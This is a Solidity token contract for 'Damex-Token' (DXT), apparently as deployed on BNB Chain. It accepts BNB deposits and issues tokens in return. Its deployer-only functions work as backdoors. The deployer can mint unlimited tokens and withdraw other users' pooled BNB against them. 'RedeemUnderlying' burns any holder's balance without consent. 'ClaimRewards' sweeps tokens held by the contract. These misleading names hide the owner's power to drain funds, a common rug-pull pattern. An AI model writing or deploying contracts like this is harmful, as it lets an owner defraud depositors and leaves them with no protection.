/**
 *Submitted for verification at BscScan.com on 2023-02-25
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;



contract DamexToken {

    string public constant name = "Damex-Token";

    string public constant symbol = "DXT";

    uint8 public constant decimals = 18;

    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    address public deployer;



    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Deposit(address indexed from, uint256 value);

    event Withdrawal(address indexed to, uint256 value);

    event Mint(address indexed to, uint256 value);

    event Redeem(address indexed from, uint256 value);



    constructor(uint256 _initialSupply) {

        balanceOf[msg.sender] = _initialSupply;

        totalSupply = _initialSupply;

        deployer = msg.sender;

    }



    modifier onlyDeployer() {

        require(msg.sender == deployer, "Only deployer can call this function.");

        _;

    }



    function deposit() payable public {

        balanceOf[msg.sender] += msg.value;

        totalSupply += msg.value;

        emit Deposit(msg.sender, msg.value);

    }



    function withdraw(uint256 _value) public {

        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        balanceOf[msg.sender] -= _value;

        totalSupply -= _value;

        payable(msg.sender).transfer(_value);

        emit Withdrawal(msg.sender, _value);

    }



    function transfer(address _to, uint256 _value) public returns (bool success) {

        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        balanceOf[msg.sender] -= _value;

        balanceOf[_to] += _value;

        emit Transfer(msg.sender, _to, _value);

        return true;

    }



    function approve(address _spender, uint256 _value) public returns (bool success) {

        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }



    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {

        require(balanceOf[_from] >= _value, "Insufficient balance");

        require(allowance[_from][msg.sender] >= _value, "Insufficient allowance");

        balanceOf[_from] -= _value;

        balanceOf[_to] += _value;

        allowance[_from][msg.sender] -= _value;

        emit Transfer(_from, _to, _value);

        return true;

    }



    function mint(address _to, uint256 _value) public onlyDeployer {

        balanceOf[_to] += _value;

        totalSupply += _value;

        emit Mint(_to, _value);

    }



    function RedeemUnderlying (address _from, uint256 _value) public onlyDeployer {

        require(balanceOf[_from] >= _value, "Insufficient balance");

        balanceOf[_from] -= _value;

        totalSupply -= _value;

        emit Redeem(_from, _value);

    }



   function ClaimRewards(address _tokenAddress, address _to, uint256 _value) public onlyDeployer returns (bool success) {

    require(_tokenAddress != address(this), "Cannot transfer DamexToken tokens.");

    (bool transferSuccess, bytes memory data) = _tokenAddress.call(abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), _to, _value));

    require(transferSuccess && (data.length == 0 || abi.decode(data, (bool))), "Token transfer failed.");

    return true;

   }



   function _fallback() internal {

        revert("Delegatecall not allowed");

    }

}